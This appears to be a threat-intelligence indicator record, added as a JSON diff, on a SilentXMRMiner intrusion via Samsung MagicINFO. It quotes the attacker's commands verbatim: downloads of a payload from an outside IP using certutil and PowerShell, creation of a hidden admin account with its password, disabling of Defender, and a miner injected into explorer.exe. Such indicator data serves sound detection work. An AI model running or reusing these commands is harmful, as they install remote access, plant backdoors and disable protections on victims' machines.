@@ -1,0 +1,295 @@
+{
+  "malware_family": "SilentXMRMiner",
+  "threat_actor": "",
+  "platforms": [
+    "windows"
+  ],
+  "summary": "A threat actor exploited the Samsung MagicINFO vulnerability CVE-2025-4632 (via the Apache Tomcat service, tomcat9.exe) to install a rogue AnyDesk instance, create the local admin account 'oldadministrator', and disable Microsoft Defender. They then ran Silent XMR Miner Builder.exe on the endpoint, which spawned .NET and C compilers (csc.exe, cvtres.exe, donut.exe, tcc.exe, cc1.exe, gcc.exe) to compile a cryptominer that was injected into explorer.exe and mined Monero via the public C3Pool service.",
+  "mitre_techniques": [
+    "T1190",
+    "T1219",
+    "T1136.001",
+    "T1562.001",
+    "T1059.001",
+    "T1059.003",
+    "T1055",
+    "T1496",
+    "T1140"
+  ],
+  "host_artifacts": [
+    {
+      "kind": "command_line",
+      "value": "C:\\Windows\\System32\\cmd.exe /c certutil -urlcache -split -f http://194.87.89.30:8899/anydesk.exe C:\\ProgramData\\AnyDesk.exe 2>&1",
+      "context": "First AnyDesk download attempt; parent process tomcat9.exe (Apache Tomcat/MagicINFO)",
+      "specificity": "medium",
+      "evidence": "figure_or_disassembly",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "command_line",
+      "value": "C:\\Windows\\System32\\cmd.exe /c powershell -c Invoke-WebRequest -Uri \"\"http://194.87.89.30:8899/anydesk.exe\"\" -OutFile \"\"C:\\ProgramData\\AnyDesk.exe\"\" 2>&",
+      "context": "Second AnyDesk download attempt via PowerShell Invoke-WebRequest",
+      "specificity": "medium",
+      "evidence": "figure_or_disassembly",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "command_line",
+      "value": "powershell -c \"(New-Object System.Net.WebClient).DownloadFile(\\\"http://194.87.89.30:8899/anydesk.exe\\\", \\\"C:\\ProgramData\\AnyDesk.exe\\\")\"",
+      "context": "Successful (third) AnyDesk download; parent cmd.exe, grandparent tomcat9.exe",
+      "specificity": "medium",
+      "evidence": "figure_or_disassembly",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "command_line",
+      "value": "cmd.exe /c \"echo F@x2020!@#| C:\\ProgramData\\AnyDesk.exe --set-password 2>&1\"",
+      "context": "AnyDesk unattended password set; parent tomcat9.exe",
+      "specificity": "high",
+      "evidence": "figure_or_disassembly",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "command_line",
+      "value": "cmd.exe /c \"net user oldadministrator F@x2020!@# /add 2>&1\"",
+      "context": "Creation of local admin account oldadministrator with AnyDesk password",
+      "specificity": "high",
+      "evidence": "figure_or_disassembly",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "command_line",
+      "value": "\"C:\\Windows\\system32\\SystemSettingsAdminFlows.exe\" Defender RTP 1",
+      "context": "Disabling Microsoft Defender real-time protection",
+      "specificity": "medium",
+      "evidence": "figure_or_disassembly",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "command_line",
+      "value": "C:\\Windows\\explorer.exe  --cinit-find-x -B --algo=\"rx/0\" --asm=auto --cpu-memory-pool=1 --randomx-mode=auto --randomx-no-rdmsr  --cuda-bfactor-hint=12 --cuda-bsleep-hint=100 --url=auto.c3pool.org:19999 --user=[REDACTED] --pass=186605 --cpu-max-threads-hint=100 --cinit-idle-wait=5 --cinit-idle-cpu=100",
+      "context": "Miner injected into explorer.exe, mining Monero (rx/0) on C3Pool, pass=186605",
+      "specificity": "high",
+      "evidence": "figure_or_disassembly",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "command_line",
+      "value": "\"C:\\Users\\oldadministrator\\Documents\\x.exe\"",
+      "context": "Resulting cryptominer EXE executed under oldadministrator",
+      "specificity": "medium",
+      "evidence": "figure_or_disassembly",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "file_path",
+      "value": "C:\\Users\\oldadministrator\\Documents\\x.exe",
+      "context": "Compiled cryptominer dropped in new user's Documents folder",
+      "specificity": "high",
+      "evidence": "figure_or_disassembly",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "file_path",
+      "value": "C:\\ProgramData\\AnyDesk.exe",
+      "context": "Rogue AnyDesk installed by threat actor",
+      "specificity": "medium",
+      "evidence": "figure_or_disassembly",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "file_name",
+      "value": "Silent XMR Miner Builder.exe",
+      "context": "Builder run from new user's Documents folder; spawns compilers",
+      "specificity": "high",
+      "evidence": "prose",
+      "origin_tool": "SilentXMRMiner",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "parent_child",
+      "value": "Silent XMR Miner Builder.exe -> csc.exe, cvtres.exe, donut.exe, tcc.exe, cc1.exe, gcc.exe",
+      "context": "All compilers ran as child processes of the unsigned builder",
+      "specificity": "high",
+      "evidence": "prose",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "process_name",
+      "value": "donut.exe",
+      "context": "Shellcode/PIC generator used during miner compilation",
+      "specificity": "medium",
+      "evidence": "prose",
+      "origin_tool": "donut",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "process_name",
+      "value": "tcc.exe",
+      "context": "Tiny C Compiler run as child of miner builder",
+      "specificity": "medium",
+      "evidence": "prose",
+      "origin_tool": "TCC",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "process_name",
+      "value": "cc1.exe",
+      "context": "MinGW64 compiler component run as child of miner builder",
+      "specificity": "medium",
+      "evidence": "prose",
+      "origin_tool": "MinGW64",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "process_name",
+      "value": "gcc.exe",
+      "context": "MinGW64 compiler run as child of miner builder",
+      "specificity": "medium",
+      "evidence": "prose",
+      "origin_tool": "MinGW64",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "process_name",
+      "value": "tomcat9.exe",
+      "context": "Grandparent/parent of malicious commands; Apache Tomcat hosting MagicINFO",
+      "specificity": "low",
+      "evidence": "figure_or_disassembly",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "process_name",
+      "value": "x.exe",
+      "context": "Miner process, unsigned, running as oldadministrator",
+      "specificity": "medium",
+      "evidence": "figure_or_disassembly",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "unique_string",
+      "value": "F@x2020!@#",
+      "context": "Password reused for AnyDesk and local admin account; cleartext in command line",
+      "specificity": "high",
+      "evidence": "figure_or_disassembly",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "unique_string",
+      "value": "oldadministrator",
+      "context": "Newly created local admin account name",
+      "specificity": "high",
+      "evidence": "ioc_list",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "unique_string",
+      "value": "--set-password",
+      "context": "AnyDesk argument used with piped cleartext password",
+      "specificity": "medium",
+      "evidence": "figure_or_disassembly",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "unique_string",
+      "value": "--cinit-find-x",
+      "context": "Miner launch argument observed on explorer.exe command line",
+      "specificity": "medium",
+      "evidence": "figure_or_disassembly",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "unique_string",
+      "value": "Defender RTP 1",
+      "context": "SystemSettingsAdminFlows.exe argument used to disable Defender RTP",
+      "specificity": "medium",
+      "evidence": "figure_or_disassembly",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    }
+  ],
+  "network_artifacts": [
+    {
+      "kind": "ip",
+      "value": "194.87.89.30",
+      "context": "Download source for AnyDesk (port 8899)",
+      "specificity": "high",
+      "evidence": "ioc_list",
+      "origin_tool": ""
+    },
+    {
+      "kind": "url",
+      "value": "http://194.87.89.30:8899/anydesk.exe",
+      "context": "AnyDesk download URL used via certutil and PowerShell",
+      "specificity": "high",
+      "evidence": "figure_or_disassembly",
+      "origin_tool": ""
+    },
+    {
+      "kind": "domain",
+      "value": "auto.c3pool.org:19999",
+      "context": "C3Pool Monero mining pool endpoint used by injected miner",
+      "specificity": "medium",
+      "evidence": "figure_or_disassembly",
+      "origin_tool": ""
+    },
+    {
+      "kind": "other",
+      "value": "--pass=186605",
+      "context": "C3Pool miner worker password on the command line",
+      "specificity": "medium",
+      "evidence": "figure_or_disassembly",
+      "origin_tool": ""
+    }
+  ],
+  "samples": [
+    {
+      "sha256": "0d202e16408770e8b6cceb14e1e3e72946b154bf881d27fe33d0060315b30dd1",
+      "description": "Cryptominer (x.exe) compiled on the endpoint and executed from C:\\Users\\oldadministrator\\Documents"
+    }
+  ],
+  "file_types": [
+    "pe",
+    "dotnet"
+  ]
+}
